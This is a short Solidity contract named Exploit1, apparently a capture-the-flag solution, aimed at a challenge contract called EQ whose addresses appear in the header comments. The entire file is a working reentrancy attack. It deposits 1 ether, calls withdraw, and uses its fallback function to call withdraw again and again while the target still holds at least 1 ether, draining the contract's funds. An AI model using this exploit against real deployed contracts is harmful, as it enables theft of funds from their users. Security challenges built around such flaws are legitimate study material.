//Challenge addy 0xD2034a50C5Adc8A190D4f8c8EE18643Ab8A0ff05
// Setup addy 0x46C9489797c5647F850dD3A5bcB13C240bcd383A
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;

import "./EQ.sol";

contract Exploit1 {
    
    EQ public exploit;
    address public target;

    constructor(address _instance) payable {
        exploit = EQ(_instance);
        target = _instance;   
    }
    function solve1() public payable
    {
        require (msg.value == 1 ether);
        exploit.deposit{value: 1 ether}();
    }

    function solve2() public payable
    {
        exploit.withdraw();
    }
        
    
    fallback() external payable{

        if (address(target).balance >= 1 ether)
        {
            exploit.withdraw();
        }
        

    }
    
    
}

